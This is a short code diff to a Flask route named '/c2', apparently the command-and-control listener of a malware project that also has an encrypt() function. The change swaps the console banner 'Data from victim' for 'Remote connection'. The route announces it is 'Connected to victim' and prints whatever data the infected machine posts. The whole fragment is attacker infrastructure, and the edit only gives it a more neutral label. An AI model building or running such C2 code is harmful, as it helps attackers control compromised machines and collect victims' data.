@@ -34,7 +34,7 @@ def encrypt():
 @views.route("/c2", methods=["POST"])
 def c2():
     print("")
-    print(Fore.RED + f"~~~~~~~~~~~~~~~~~~~~ Data from victim ~~~~~~~~~~~~~~~~~~~~")
+    print(Fore.RED + f"~~~~~~~~~~~~~~~~~~~~ Remote connection ~~~~~~~~~~~~~~~~~~~~")
     print(Fore.RED + "Connected to victim, send STOP to end the session")
     print(Fore.WHITE + str(request.data))
     print(Style.RESET_ALL)
